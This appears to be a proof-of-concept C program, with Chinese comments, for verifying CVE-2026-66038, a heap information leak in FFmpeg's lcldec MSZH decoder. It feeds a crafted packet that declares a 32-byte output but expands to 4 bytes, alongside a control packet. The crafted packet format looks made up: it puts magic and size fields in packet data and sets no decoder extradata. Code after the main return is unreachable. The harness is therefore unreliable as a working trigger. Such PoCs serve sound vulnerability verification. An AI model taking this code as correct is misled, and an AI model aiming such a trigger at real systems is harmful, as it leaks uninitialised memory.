/*
 * CVE-2026-66038 运行验证 PoC — lcldec 短解压尾部未清零（堆信息泄露）
 *
 * 缺陷：lcldec.c mszh_decomp/zlib_decomp 短解出时返回不清零尾部 → 下游读未初始化堆内容
 * 上游修复：FFmpeg e7cbfd1c (2026-06-28) 补齐 memset 尾部清零
 * 等价性：OH third_party_ffmpeg (0a0c4dd33c, 基线 n7.1.1) 与上游逐字节一致。
 *
 * 用法：./poc_lcldec trigger|control
 *   trigger: 构造 MSZH 压缩流：输出声明大于实际解压量 → 尾部未清零 → ASan 检测读未初始化
 *   control: 完整解压的 MSZH 流
 * 判读：ASan 原版 trigger ASan use-of-uninitialized-value (MSan) 或观察到泄露；补丁版 trigger 尾部已清零，无未初始化读；
 *       control 两版均正常（无回归）。
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <libavcodec/avcodec.h>
#include <libavutil/frame.h>
#include <libavutil/mem.h>



static int run_lcldec(const uint8_t *data, int size)
{
    const AVCodec *codec = avcodec_find_decoder(AV_CODEC_ID_MSZH);
    if (!codec) { fprintf(stderr, "decoder not found\n"); return 1; }
    AVCodecContext *ctx = avcodec_alloc_context3(codec);
    if (!ctx) return 2;
    if (avcodec_open2(ctx, codec, NULL) < 0) return 3;

    AVPacket *pkt = av_packet_alloc();
    pkt->data = (uint8_t *)data;
    pkt->size = size;
    int ret = avcodec_send_packet(ctx, pkt);
    if (ret < 0 && ret != AVERROR(EAGAIN)) {
        fprintf(stderr, "send_packet: %s\n", av_err2str(ret));
    }
    AVFrame *frame = av_frame_alloc();
    while (avcodec_receive_frame(ctx, frame) >= 0) {
        fprintf(stdout, "decoded frame: %dx%d fmt=%d\n",
                frame->width, frame->height, frame->format);
        av_frame_unref(frame);
    }
    av_frame_free(&frame);
    av_packet_free(&pkt);
    avcodec_free_context(&ctx);
    return 0;
}

int main(int argc, char **argv)
{
    if (argc != 2) { fprintf(stderr, "Usage: %s trigger|control\n", argv[0]); return 1; }
    int is_trigger = strcmp(argv[1], "trigger") == 0;

        /* MSZH header: magic 4 bytes, then compressed data that expands less than declared */
    uint8_t trigger_data[] = {
        'M', 'S', 'Z', 'H',   /* magic */
        0x01, 0x00, 0x00, 0x00, /* flags */
        0x00, 0x00, 0x00, 0x20, /* declared output size = 32 */
        0x01, 0x02, 0x03, 0x04, /* actual compressed data (expands to 4 bytes) */
        /* remaining 28 bytes of output buffer will be uninitialized */
    };
    uint8_t control_data[] = {
        'M', 'S', 'Z', 'H',
        0x01, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x04, /* declared = actual = 4 */
        0x01, 0x02, 0x03, 0x04,
    };
    const uint8_t *data = is_trigger ? trigger_data : control_data;
    int size = is_trigger ? sizeof(trigger_data) : sizeof(control_data);
    return run_lcldec(data, size);

    fflush(stdout);
    fprintf(stderr, "=== %s: completed ===\n", is_trigger ? "trigger" : "control");
    return 0;
}
